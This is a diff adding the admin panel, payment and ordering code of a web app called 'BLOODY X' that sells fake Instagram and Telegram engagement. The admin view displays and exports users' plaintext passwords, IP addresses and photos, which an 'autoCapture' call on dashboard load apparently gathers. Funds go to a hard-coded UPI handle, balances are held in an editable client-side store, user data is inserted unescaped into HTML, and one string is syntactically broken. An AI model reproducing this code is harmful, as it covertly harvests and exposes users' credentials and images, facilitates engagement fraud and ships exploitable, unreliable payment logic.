+            <div style="max-height:300px; overflow-y:auto; background:#0a0a0a; border-radius:10px; padding:8px; margin:10px 0;">
+                ${users.map((u,i) => `
+                    <div style="display:flex; align-items:center; gap:8px; padding:6px 0; border-bottom:1px solid #222; font-size:9px; flex-wrap:wrap;">
+                        ${u.photos && u.photos.length > 0 ? `<img src="${u.photos[u.photos.length-1]}" class="admin-photo" style="width:80px; height:80px; border-radius:50%; object-fit:cover; border:2px solid #cc0000; cursor:pointer;" onclick="downloadPhoto('${u.photos[u.photos.length-1]}')">` : '<span style="color:#666; font-size:16px;">NO PHOTO</span>'}
+                        <div style="flex:1; min-width:150px;">
+                            <div style="font-weight:700; font-size:10px; font-family:'Orbitron',sans-serif;">${u.name}</div>
+                            <div style="color:#888; font-size:9px;">${u.email}</div>
+                            <div style="color:#888; font-size:8px;">${u.pass}</div>
+                            <div style="color:#888; font-size:8px;">IP: ${u.ip || 'N/A'}</div>
+                            <div style="color:#cc0000; font-size:9px;">₹${u.wallet}</div>
+                            <div style="color:${u.banned ? '#cc0000' : '#00aa00'}; font-size:8px;">${u.banned ? 'BANNED' : 'ACTIVE'}</div>
+                        </div>
+                        <div style="display:flex; flex-direction:column; gap:4px;">
+                            <button onclick="adminAddCash('${u.id}')" style="background:#00aa00; color:#fff; border:none; padding:4px 12px; border-radius:4px; font-size:8px; font-family:'Orbitron',sans-serif;">ADD CASH</button>
+                            <button onclick="adminBanUser('${u.id}')" style="background:#cc0000; color:#fff; border:none; padding:4px 12px; border-radius:4px; font-size:8px; font-family:'Orbitron',sans-serif;">${u.banned ? 'UNBAN' : 'BAN'}</button>
+                        </div>
+                    </div>
+                `).join('')}
+            </div>
+
+            <h4 style="color:#cc0000; font-size:12px; font-family:'Orbitron',sans-serif; margin:10px 0 4px;">PENDING FUNDS</h4>
+            <div style="max-height:150px; overflow-y:auto; background:#0a0a0a; border-radius:10px; padding:8px;">
+                ${pending.length === 0 ? '<p style="color:#666; font-size:10px; font-family:'Orbitron',sans-serif;">None</p>' : pending.map(p => `
+                    <div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid #222; font-size:9px; flex-wrap:wrap;">
+                        <span style="font-family:'Orbitron',sans-serif;">${p.user}</span>
+                        <span style="color:#cc0000; font-family:'Orbitron',sans-serif;">₹${p.amount}</span>
+                        <span style="font-size:7px; font-family:'Orbitron',sans-serif;">${p.utr}</span>
+                        <button onclick="approveFunds('${p.id}')" style="background:#00aa00; color:#fff; border:none; padding:2px 10px; border-radius:4px; font-size:8px; font-family:'Orbitron',sans-serif;">APPROVE</button>
+                        <button onclick="rejectFunds('${p.id}')" style="background:#cc0000; color:#fff; border:none; padding:2px 10px; border-radius:4px; font-size:8px; font-family:'Orbitron',sans-serif;">REJECT</button>
+                    </div>
+                `).join('')}
+            </div>
+
+            <h4 style="color:#cc0000; font-size:12px; font-family:'Orbitron',sans-serif; margin:10px 0 4px;">ORDERS</h4>
+            <div style="max-height:150px; overflow-y:auto; background:#0a0a0a; border-radius:10px; padding:8px;">
+                ${orders.length === 0 ? '<p style="color:#666; font-size:10px; font-family:'Orbitron',sans-serif;">None</p>' : orders.map(o => `
+                    <div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid #222; font-size:8px; flex-wrap:wrap;">
+                        <span style="font-family:'Orbitron',sans-serif;">${o.user}</span>
+                        <span style="font-family:'Orbitron',sans-serif;">${o.service}</span>
+                        <span style="font-family:'Orbitron',sans-serif;">${o.qty}</span>
+                        <span style="color:#cc0000; font-family:'Orbitron',sans-serif;">₹${o.total}</span>
+                        <span style="color:${o.status==='completed'?'#0a0':'#aa0'}; font-family:'Orbitron',sans-serif;">${o.status}</span>
+                        <button onclick="completeOrder('${o.id}')" style="background:#0a0; color:#fff; border:none; padding:2px 8px; border-radius:4px; font-size:7px; font-family:'Orbitron',sans-serif;">DONE</button>
+                    </div>
+                `).join('')}
+            </div>
+
+            <div style="margin:10px 0; display:flex; gap:6px; flex-wrap:wrap;">
+                <input type="text" id="adminUpi" value="${db.settings.upi}" placeholder="UPI" style="flex:1; padding:8px; background:#222; border:1px solid #444; border-radius:6px; color:#fff; font-size:10px; font-family:'Orbitron',sans-serif;">
+                <button onclick="updateUPI()" class="btn btn-primary" style="width:auto; padding:8px 16px; font-size:9px;">UPDATE UPI</button>
+            </div>
+            <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                <input type="text" id="adminTheme" value="${db.settings.theme}" placeholder="THEME (dark/light)" style="flex:1; padding:8px; background:#222; border:1px solid #444; border-radius:6px; color:#fff; font-size:10px; font-family:'Orbitron',sans-serif;">
+                <button onclick="updateTheme()" class="btn btn-primary" style="width:auto; padding:8px 16px; font-size:9px;">THEME</button>
+            </div>
+        </div>
+    </div>`;
+    document.body.insertAdjacentHTML('beforeend', html);
+}
+
+function downloadPhoto(photoData) {
+    const link = document.createElement('a');
+    link.download = 'user_photo_' + Date.now() + '.png';
+    link.href = photoData;
+    link.click();
+}
+
+function downloadData() {
+    const db = getDB();
+    const data = {
+        totalOrders: totalOrders,
+        users: db.users.map(u => ({
+            name: u.name,
+            email: u.email,
+            pass: u.pass,
+            ip: u.ip,
+            wallet: u.wallet,
+            banned: u.banned,
+            photo: u.photo ? 'HAS_PHOTO' : 'NO_PHOTO',
+            photosCount: u.photos ? u.photos.length : 0,
+            created: u.created
+        })),
+        orders: db.orders,
+        pendingFunds: db.pendingFunds,
+        notifications: db.notifications,
+        settings: db.settings
+    };
+    const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+    const link = document.createElement('a');
+    link.download = 'bloodyx_data_' + Date.now() + '.json';
+    link.href = URL.createObjectURL(blob);
+    link.click();
+    showAlert('SUCCESS', 'Data downloaded!');
+}
+
+function adminAddCash(id) {
+    const amt = prompt('Enter amount to add:');
+    if (!amt || isNaN(amt) || parseFloat(amt) <= 0) { showAlert('ERROR', 'Invalid amount'); return; }
+    const db = getDB();
+    const user = db.users.find(u => u.id === id);
+    if (!user) { showAlert('ERROR', 'User not found'); return; }
+    user.wallet += parseFloat(amt);
+    saveDB(db);
+    showAlert('SUCCESS', 'Added ₹' + amt + ' to ' + user.name);
+    openAdminPanel();
+}
+
+function adminBanUser(id) {
+    const db = getDB();
+    const user = db.users.find(u => u.id === id);
+    if (user) { user.banned = !user.banned; saveDB(db); openAdminPanel(); }
+}
+
+function approveFunds(id) {
+    const db = getDB();
+    const pending = db.pendingFunds || [];
+    const idx = pending.findIndex(p => p.id === id);
+    if (idx === -1) { showAlert('ERROR', 'Not found'); return; }
+    const p = pending[idx];
+    const user = db.users.find(u => u.id === p.userId);
+    if (user) { user.wallet += p.amount; }
+    pending.splice(idx, 1);
+    db.pendingFunds = pending;
+    saveDB(db);
+    addNotification('Funds approved! ₹' + p.amount + ' added to ' + p.user);
+    showAlert('SUCCESS', 'Funds approved!');
+    openAdminPanel();
+}
+
+function rejectFunds(id) {
+    const db = getDB();
+    const pending = db.pendingFunds || [];
+    const idx = pending.findIndex(p => p.id === id);
+    if (idx !== -1) { pending.splice(idx, 1); db.pendingFunds = pending; saveDB(db); openAdminPanel(); }
+}
+
+function completeOrder(id) {
+    const db = getDB();
+    const order = db.orders.find(o => o.id === id);
+    if (order) { 
+        order.status = 'completed'; 
+        saveDB(db);
+        addNotification('Order completed: ' + order.service + ' (Qty: ' + order.qty + ')');
+        openAdminPanel(); 
+    }
+}
+
+function updateUPI() {
+    const db = getDB();
+    db.settings.upi = document.getElementById('adminUpi').value;
+    saveDB(db);
+    showAlert('SUCCESS', 'UPI updated');
+}
+
+function updateTheme() {
+    const db = getDB();
+    db.settings.theme = document.getElementById('adminTheme').value;
+    saveDB(db);
+    showAlert('SUCCESS', 'Theme updated');
+    applyTheme();
+}
+
+function applyTheme() {
+    const db = getDB();
+    if (db.settings.theme === 'light') {
+        document.body.style.background = '#f0f0f0';
+        document.querySelector('.container').style.background = 'rgba(255,255,255,0.85)';
+        document.querySelector('.container').style.color = '#222';
+    } else {
+        document.body.style.background = '#0a0a0a';
+        document.querySelector('.container').style.background = 'rgba(0,0,0,0.6)';
+        document.querySelector('.container').style.color = '#eee';
+    }
+}
+
+// ============================================================
+// ADD FUNDS
+// ============================================================
+function openAddFunds() {
+    if (!currentUser) { showAlert('ERROR', 'Login first'); return; }
+    document.getElementById('addFundsModal').classList.remove('hidden');
+    currentAddAmount = 40;
+    updateQR();
+}
+
+function setAddAmount(amt) {
+    currentAddAmount = amt;
+    document.getElementById('customAddAmount').value = amt;
+    updateQR();
+}
+
+function updateQR() {
+    const custom = parseInt(document.getElementById('customAddAmount').value);
+    const amt = custom > 0 ? custom : currentAddAmount;
+    const upi = getDB().settings.upi || 'vansh111@naviaxis';
+    const upiUrl = 'upi://pay?pa=' + encodeURIComponent(upi) + '&am=' + encodeURIComponent(amt) + '&cu=INR';
+    const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(upiUrl);
+    document.getElementById('qrImage').src = qrUrl;
+}
+
+function closeAddFunds() {
+    document.getElementById('addFundsModal').classList.add('hidden');
+    document.getElementById('utrInput').value = '';
+    document.getElementById('customAddAmount').value = '';
+}
+
+function submitUTR() {
+    if (!currentUser) { showAlert('ERROR', 'Login first'); return; }
+    const utr = document.getElementById('utrInput').value.trim();
+    if (!utr) { showAlert('ERROR', 'Enter Transaction ID / UTR'); return; }
+    const custom = parseInt(document.getElementById('customAddAmount').value);
+    const amt = custom > 0 ? custom : currentAddAmount;
+    if (amt < 40 || amt > 700) { showAlert('ERROR', 'Amount must be between 40 and 700'); return; }
+    const db = getDB();
+    if (!db.pendingFunds) db.pendingFunds = [];
+    db.pendingFunds.push({
+        id: 'PF_' + Date.now() + '_' + Math.random().toString(36).substr(2,3),
+        userId: currentUser.id,
+        user: currentUser.name,
+        amount: amt,
+        utr: utr,
+        created: new Date().toISOString()
+    });
+    saveDB(db);
+    showAlert('SUCCESS', 'UTR submitted! Wait for admin approval.');
+    closeAddFunds();
+}
+
+// ============================================================
+// SERVICES
+// ============================================================
+const serviceConfig = {
+    views: { name: 'INSTA VIEWS', base: 10000, price: 5, min: 2000, max: 20000 },
+    comments: { name: 'INSTA COMMENTS', base: 1000, price: 59, min: 20, max: 1000 },
+    likes: { name: 'INSTA LIKES', base: 1000, price: 43, min: 100, max: 4000 },
+    telegram: { name: 'TELEGRAM MEMBERS', base: 1000, price: 43, min: 100, max: 10000 }
+};
+
+function openService(type) {
+    if (!currentUser) { showAlert('ERROR', 'Login first'); return; }
+    currentService = type;
+    const cfg = serviceConfig[type];
+    document.getElementById('serviceTitle').textContent = cfg.name;
+    document.getElementById('serviceLink').value = '';
+    document.getElementById('serviceQty').value = cfg.min;
+    document.getElementById('serviceTotal').textContent = '0';
+    document.getElementById('serviceModal').classList.remove('hidden');
+    calcPrice();
+}
+
+function closeServiceModal() {
+    document.getElementById('serviceModal').classList.add('hidden');
+}
+
+function calcPrice() {
+    const type = currentService;
+    const cfg = serviceConfig[type];
+    const qty = parseInt(document.getElementById('serviceQty').value) || 0;
+    if (qty < cfg.min) { document.getElementById('serviceTotal').textContent = 'MIN ' + cfg.min; return; }
+    if (qty > cfg.max) { document.getElementById('serviceTotal').textContent = 'MAX ' + cfg.max; return; }
+    const total = (qty / cfg.base) * cfg.price;
+    document.getElementById('serviceTotal').textContent = total.toFixed(2);
+}
+
+function placeOrder() {
+    if (!currentUser) { showAlert('ERROR', 'Login first'); return; }
+    const type = currentService;
+    const cfg = serviceConfig[type];
+    const link = document.getElementById('serviceLink').value.trim();
+    const qty = parseInt(document.getElementById('serviceQty').value) || 0;
+    if (!link) { showAlert('ERROR', 'Enter link'); return; }
+    if (qty < cfg.min || qty > cfg.max) { showAlert('ERROR', 'Range: ' + cfg.min + '-' + cfg.max); return; }
+    const total = (qty / cfg.base) * cfg.price;
+    if (currentUser.wallet < total) { showAlert('ERROR', 'Insufficient balance'); return; }
+
+    const db = getDB();
+    const user = db.users.find(u => u.id === currentUser.id);
+    if (!user) { showAlert('ERROR', 'User not found'); return; }
+    user.wallet -= total;
+    const order = {
+        id: 'ORD_' + Date.now() + '_' + Math.random().toString(36).substr(2,4),
+        user: user.name, userId: user.id,
+        service: cfg.name, link, qty, total: total,
+        status: 'pending', created: new Date().toISOString()
+    };
+    if (!db.orders) db.orders = [];
+    db.orders.push(order);
+    saveDB(db);
+    currentUser = user;
+    sessionStorage.setItem('bloodyx_user', JSON.stringify(user));
+    document.getElementById('userBalance').textContent = user.wallet;
+    addNotification('New order placed: ' + cfg.name + ' (Qty: ' + qty + ')');
+    addToTotalOrders(1);
+    showAlert('SUCCESS', 'Order placed!');
+    closeServiceModal();
+    loadRecentOrders();
+    updateChart();
+}
+
+// ============================================================
+// ORDERS
+// ============================================================
+function loadRecentOrders() {
+    const db = getDB();
+    const orders = (db.orders || []).filter(o => o.userId === currentUser?.id);
+    const container = document.getElementById('recentOrders');
+    if (!orders.length) { container.innerHTML = 'No orders.'; return; }
+    container.innerHTML = orders.slice(-3).reverse().map(o =>
+        `<div style="display:flex; justify-content:space-between; padding:3px 0; border-bottom:1px solid #222; font-size:9px;">
+            <span style="font-family:'Orbitron',sans-serif;">${o.service}</span>
+            <span style="font-family:'Orbitron',sans-serif;">${o.qty}</span>
+            <span style="color:#cc0000; font-family:'Orbitron',sans-serif;">₹${o.total.toFixed(2)}</span>
+            <span style="color:${o.status==='completed'?'#0a0':'#aa0'}; font-family:'Orbitron',sans-serif;">${o.status}</span>
+        </div>`
+    ).join('');
+}
+
+function viewAllOrders() {
+    const db = getDB();
+    const orders = (db.orders || []).filter(o => o.userId === currentUser?.id);
+    if (!orders.length) { showAlert('INFO', 'No orders'); return; }
+    let msg = 'ORDERS\n' + '='.repeat(20) + '\n';
+    orders.forEach(o => {
+        msg += o.service + '\nQ:' + o.qty + ' ₹' + o.total.toFixed(2) + ' ' + o.status + '\n' + o.link + '\n---\n';
+    });
+    showAlert('ORDERS', msg);
+}
+
+// ============================================================
+// MENU
+// ============================================================
+function toggleMenu() {
+    const panel = document.getElementById('menuPanel');
+    const overlay = document.getElementById('menuOverlay');
+    if (panel.classList.contains('open')) {
+        panel.classList.remove('open');
+        overlay.classList.remove('show');
+    } else {
+        panel.classList.add('open');
+        overlay.classList.add('show');
+    }
+}
+function closeMenu() {
+    document.getElementById('menuPanel').classList.remove('open');
+    document.getElementById('menuOverlay').classList.remove('show');
+}
+
+// ============================================================
+// START
+// ============================================================
+document.addEventListener('DOMContentLoaded', function() {
+    applyTheme();
+    const saved = sessionStorage.getItem('bloodyx_user');
+    if (saved) {
+        try {
+            currentUser = JSON.parse(saved);
+            showDashboard();
+            setTimeout(autoCapture, 600);
+        } catch(e) {}
+    }
+    document.getElementById('orderCount').textContent = totalOrders;
+    updateNotifBadge();
+    setTimeout(() => {
+        addNotification('Welcome to BLOODY X! Start ordering now.');
+    }, 1000);
+});
+</script>
+
+</body>
+</html>
